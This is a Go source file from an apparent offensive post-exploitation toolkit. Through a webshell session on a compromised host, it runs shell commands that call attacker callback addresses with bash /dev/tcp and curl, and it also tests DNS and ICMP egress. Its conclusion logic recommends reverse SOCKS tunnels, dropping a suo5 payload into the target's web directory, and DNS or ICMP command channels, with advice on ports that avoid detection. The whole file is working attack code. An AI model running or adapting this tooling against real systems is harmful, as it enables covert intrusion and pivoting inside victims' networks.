// probe.go 是四件套之 probe：经会话在目标侧真实执行出网探针（TCP 到各
// attackAddr、DNS 解析、HTTP 出网、ICMP 可选），回显用确定性哨兵标记解析，
// Conclude 做证据分档选型（照 pivot 骨架：能 TCP 出→反向 socks;只 DNS→命令通道
// 级说明；全断→建议正向/webshell 通道）。解析与分档都是纯函数。
//
// TCP 探针是三态判定而非「连上才算通」:connect 成功=reachable；快速 RST/拒连
// (refused)=reachable（路径通、对端暂无监听——RST 证明包能到，隧道监听该口即可
// 回连）；超时/无响应=filtered（真被过滤）。探测目标除常用口 443/80/53 外，还含
// 隧道端口池采样（ProbeAddrs：起始终端各 1 个），隧道实际要用的端口必须被探测到。
package tunnel

import (
	"context"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/session"
)

// probeTimeout 是单条探针命令的目标侧超时。
const probeTimeout = 20 * time.Second

// TCPState 是 TCP 探针的三态结论。判定从「连上才算通」改为区分路径证据：
// 对授权内网场景，防火墙上「未监听」与「丢包过滤」是两种截然不同的姿态——
// RST(refused）证明包能到对端，路径是通的，隧道监听该口即可回连；
// 超时才说明包被过滤，路径真不通。
type TCPState string

const (
	TCPConnected TCPState = "connected" // 有服务监听，connect 成功
	TCPRefused   TCPState = "refused"   // 快速 RST/拒连：路径通、暂无监听
	TCPFiltered  TCPState = "filtered"  // 超时/无响应：被过滤，路径不通
	TCPFail      TCPState = "fail"      // 其它失败（无 bash、解析失败等）
)

// ProbeResult 是一条探针的证据。
type ProbeResult struct {
	Name   string `json:"name"`   // tcp_1 / http_1 / dns / icmp
	Kind   string `json:"kind"`   // tcp | http | dns | icmp
	Target string `json:"target"` // 探测对端
	OK     bool   `json:"ok"`
	State  string `json:"state,omitempty"` // tcp 探针的三态（connected/refused/filtered/fail)
	Detail string `json:"detail"`          // 回显摘要（截断）
}

// ProbeReport 是结构化出网报告。
type ProbeReport struct {
	SessionID int64         `json:"session_id"`
	Results   []ProbeResult `json:"results"`
}

// OKKind 返回某类探针是否有通的。
func (r *ProbeReport) OKKind(kind string) bool {
	for _, p := range r.Results {
		if p.Kind == kind && p.OK {
			return true
		}
	}
	return false
}

// FirstOKPort 返回首个 TCP 探通的对端端口（建议 server 监听口：回连走得通）。
func (r *ProbeReport) FirstOKPort() int {
	for _, p := range r.Results {
		if p.Kind != "tcp" || !p.OK {
			continue
		}
		if _, port, err := net.SplitHostPort(p.Target); err == nil {
			if n, err := strconv.Atoi(port); err == nil {
				return n
			}
		}
	}
	return 0
}

// probeCmd 组装一条带确定性哨兵的探针命令。标记形如 ARTEX_<TAG>_OK /
// ARTEX_<TAG>_FAIL，解析只认标记（PivotHub 语义：输出污染/粘连不得误判）。
func probeCmd(kind, tag, target string) string {
	ok := "ARTEX_" + tag + "_OK"
	fail := "ARTEX_" + tag + "_FAIL"
	host, port, _ := net.SplitHostPort(target)
	switch kind {
	case "tcp":
		// /dev/tcp 是 bash 特性;sh 不存在时经 bash -c 兜底，bash 也没有则 FAIL。
		// 三态判定：rc=0 连接成功;rc=124 是 timeout 包装判定的超时 → FILTERED;
		// 输出含 refused（大小写不敏感，覆盖各 bash 版本 "Connection refused" 与
		// zh locale「拒绝」措辞）→ REFUSED（快速 RST，路径通、暂无监听）;其余 FAIL。
		return fmt.Sprintf(`out=$(timeout 6 bash -c '</dev/tcp/%s/%s' 2>&1); rc=$?; `+
			`if [ $rc -eq 0 ]; then echo %s; `+
			`elif [ $rc -eq 124 ]; then echo %s_FILTERED; `+
			`elif echo "$out" | grep -qiE 'refused|拒绝'; then echo %s_REFUSED; `+
			`else echo %s_FAIL; fi`,
			host, port, ok, ok, ok, ok)
	case "http":
		// HTTP 出网：拿到任何真实 HTTP 状态码（含 403/502，多为出口代理回包）即算通；
		// 000 = 连接层失败。
		return fmt.Sprintf(`code=$(curl -s -o /dev/null -m 8 -w '%%{http_code}' http://%s/ 2>/dev/null); [ -n "$code" ] && [ "$code" != "000" ] && echo %s_$code || echo %s_$code`,
			target, ok, fail)
	case "dns":
		return fmt.Sprintf(`(getent hosts %s 2>/dev/null || nslookup %s 2>/dev/null) | grep -q . && echo %s || echo %s`,
			target, target, ok, fail)
	case "icmp":
		return fmt.Sprintf(`ping -c 1 -W 2 %s >/dev/null 2>&1 && echo %s || echo %s`, target, ok, fail)
	}
	return "echo " + fail
}

// ParseProbeOutput 解析探针回显：只认 ARTEX_<TAG>_OK / _FAIL 哨兵。
// 第二返回值表示是否找到标记（false = 通道异常/输出被污染，按不通处理但 Detail 如实记录）。纯函数。
func ParseProbeOutput(tag, out string) (ok, found bool) {
	if strings.Contains(out, "ARTEX_"+tag+"_OK") {
		return true, true
	}
	if strings.Contains(out, "ARTEX_"+tag+"_FAIL") {
		return false, true
	}
	return false, false
}

// ParseTCPOutput 解析 TCP 探针回显为三态（见 TCPState)。只认哨兵；
// 注意带后缀的标记（_OK_REFUSED 等）必须先于裸 _OK/_FAIL 匹配。纯函数。
func ParseTCPOutput(tag, out string) (state TCPState, found bool) {
	base := "ARTEX_" + tag + "_OK"
	switch {
	case strings.Contains(out, base+"_REFUSED"):
		return TCPRefused, true
	case strings.Contains(out, base+"_FILTERED"):
		return TCPFiltered, true
	case strings.Contains(out, base+"_FAIL"):
		return TCPFail, true
	case strings.Contains(out, base):
		return TCPConnected, true
	}
	return TCPFail, false
}

// ProbeAddrs 组装 TCP 探测目标：常用回连口 443/80/53 + 隧道端口池采样（起始终端
// 各 1 个，如 20000 与 21000)——隧道实际要用的端口必须被探测到，否则「常用口被过滤」
// 会掩盖「隧道端口池其实可达」。poolRange 非法时忽略池采样，不阻塞基础探测；
// 与常用口重复的池端口去重。纯函数。
func ProbeAddrs(host, poolRange string) []string {
	ports := []int{443, 80, 53}
	if lo, hi, err := ParsePortRange(poolRange); err == nil {
		ports = append(ports, lo)
		if hi != lo {
			ports = append(ports, hi)
		}
	}
	seen := map[int]bool{}
	out := make([]string, 0, len(ports))
	for _, p := range ports {
		if seen[p] {
			continue
		}
		seen[p] = true
		out = append(out, net.JoinHostPort(host, strconv.Itoa(p)))
	}
	return out
}

func detailOf(out string) string {
	out = strings.TrimSpace(out)
	const max = 200
	if len(out) > max {
		out = out[:max] + "…"
	}
	return out
}

// Probe 经会话在目标侧执行出网探针。attackAddrs 是 "host:port" 列表（通常平台
// callback 地址 + 常用回连端口）;icmp=true 时追加 ICMP 探针（可选，噪声大）。
// 单针失败不中断，证据全部入报告；会话本身失败才返回 error。
func Probe(ctx context.Context, sess session.Session, attackAddrs []string, icmp bool) (*ProbeReport, error) {
	rep := &ProbeReport{SessionID: sess.ID()}
	run := func(kind, tag, target string) {
		stdout, _, err := sess.Exec(ctx, probeCmd(kind, tag, target), probeTimeout)
		res := ProbeResult{Name: strings.ToLower(tag), Kind: kind, Target: target}
		if err != nil {
			res.Detail = "会话执行失败: " + err.Error()
		} else if kind == "tcp" {
			state, found := ParseTCPOutput(tag, stdout)
			res.State = string(state)
			// refused 算通：对授权内网场景，「未监听」与「丢包过滤」是两种姿态，
			// RST 证明包能到对端——隧道 server 监听该口即可回连。
			res.OK = state == TCPConnected || state == TCPRefused
			res.Detail = detailOf(stdout)
			if !found {
				res.Detail = "未找到探针哨兵标记（通道异常/输出污染）: " + res.Detail
			}
		} else {
			ok, found := ParseProbeOutput(tag, stdout)
			res.OK = ok
			res.Detail = detailOf(stdout)
			if !found {
				res.Detail = "未找到探针哨兵标记（通道异常/输出污染）: " + res.Detail
			}
		}
		rep.Results = append(rep.Results, res)
	}
	for i, addr := range attackAddrs {
		run("tcp", "TCP_"+strconv.Itoa(i+1), addr)
	}
	for i, addr := range attackAddrs {
		run("http", "HTTP_"+strconv.Itoa(i+1), addr)
	}
	dnsHost := ""
	if len(attackAddrs) > 0 {
		dnsHost, _, _ = net.SplitHostPort(attackAddrs[0])
	}
	if dnsHost == "" || net.ParseIP(dnsHost) != nil {
		dnsHost = "www.baidu.com" // 对端是 IP 时改测公网域名，验 DNS 递归本身
	}
	run("dns", "DNS", dnsHost)
	if icmp {
		icmpHost := dnsHost
		if net.ParseIP(icmpHost) == nil {
			icmpHost = "223.5.5.5"
		}
		run("icmp", "ICMP", icmpHost)
	}
	return rep, nil
}

// 证据分档（Conclusion.Grade)。
const (
	GradeTCPEgress = "tcp_egress" // 能 TCP 出 → 反向 socks
	GradeHTTPOnly  = "http_only"  // 仅 HTTP 出网
	GradeDNSOnly   = "dns_only"   // 仅 DNS 出网
	GradeICMPOnly  = "icmp_only"  // 仅 ICMP
	GradeIsolated  = "isolated"   // 全断
)

// Conclusion 是证据分档选型结论。
type Conclusion struct {
	Grade            string `json:"grade"`
	Feasible         bool   `json:"feasible"`                 // 反向隧道（chisel）是否可直接上
	SuggestedPort    int    `json:"suggested_port,omitempty"` // 建议 server 监听口（首个 TCP 探通口）
	SuggestedAdapter string `json:"suggested_adapter"`        // 推荐适配器：chisel | suo5
	Recommendation   string `json:"recommendation"`
}

// Conclude 证据分档选型（纯函数；档位严格不混同，照 pivot 骨架）:
//   - 任一 TCP 目标 reachable（含 refused:RST 证明包能到，对端只是暂无监听，
//     隧道 server 监听该口即可回连）→ tcp_egress，反向 socks(chisel --reverse),
//     监听口取首个探通口；
//   - 全部 filtered（超时丢包）但 HTTP 通 → http_only:HTTP 承载——suo5 走入向
//     HTTP 不依赖出网，优先；或 chisel 走 WebSocket over 443 换特征；
//   - 全 filtered 但 DNS 通 → dns_only：命令通道级（KB/s 以下），别建数据隧道；
//   - 只 ICMP → icmp_only：控制信令级；
//   - 全断 → no_egress(isolated)：反向隧道不可行，但探测本身经 webshell 会话完成
//     （即 webshell 必可用）→ 推荐 suo5(HTTP 隧道，不依赖目标出网）。
func Conclude(rep *ProbeReport) Conclusion {
	if rep.OKKind("tcp") {
		return Conclusion{
			Grade:            GradeTCPEgress,
			Feasible:         true,
			SuggestedPort:    rep.FirstOKPort(),
			SuggestedAdapter: AdapterChisel,
			Recommendation: "目标可 TCP 出网（connect 成功或 refused 拒连均算通——RST 证明路径可达，" +
				"对端只是暂无监听）：直接建反向 socks 隧道（tunnel_deploy adapter=chisel kind=socks)。" +
				"平台 chisel server 监听口优先用首个探通的回连端口（含隧道端口池采样口）；信道端口偏好 443>80>53，避 4444/8888。",
		}
	}
	if rep.OKKind("http") {
		return Conclusion{
			Grade:            GradeHTTPOnly,
			Feasible:         true,
			SuggestedAdapter: AdapterSuo5,
			Recommendation: "仅 HTTP 出网（可能有强制代理/白名单）：优先 tunnel_deploy adapter=suo5" +
				"（HTTP 隧道：payload 投到目标 Web 目录，平台经入向 HTTP 建 socks5，完全不依赖目标出网）;" +
				"或 chisel client 走 WebSocket over 443 尝试穿透，别硬撞告警窗口。",
		}
	}
	if rep.OKKind("dns") {
		return Conclusion{
			Grade:            GradeDNSOnly,
			Feasible:         false,
			SuggestedAdapter: AdapterSuo5,
			Recommendation: "仅 DNS 出网：数据隧道走 tunnel_deploy adapter=suo5(HTTP 隧道，不依赖出网）;" +
				"DNS 只可作低频命令通道（dnscat2/iodine 类，KB/s 级），别在 DNS 上建数据隧道。",
		}
	}
	if rep.OKKind("icmp") {
		return Conclusion{
			Grade:            GradeICMPOnly,
			Feasible:         false,
			SuggestedAdapter: AdapterSuo5,
			Recommendation: "仅 ICMP 可达：控制信令级通道（icmpsh 类）；数据隧道走 tunnel_deploy adapter=suo5" +
				"（HTTP 隧道，经入向 Web 口，不依赖出网）。",
		}
	}
	return Conclusion{
		Grade:            GradeIsolated,
		Feasible:         false,
		SuggestedAdapter: AdapterSuo5,
		Recommendation: "四层探针全断，目标无出网：反向隧道（chisel）不可行。但本探测经 webshell 会话完成，" +
			"即 webshell 必可用——推荐 tunnel_deploy adapter=suo5(payload 投到 webshell 同目录，" +
			"平台经入向 HTTP 建 socks5，覆盖无出网场景）。其余转向：① 目标入向有洞时建正向隧道；" +
			"② 继续走 webshell 会话通道（session_exec 即内网执行面）;③ 周期 pull 白名单域名取指令。",
	}
}
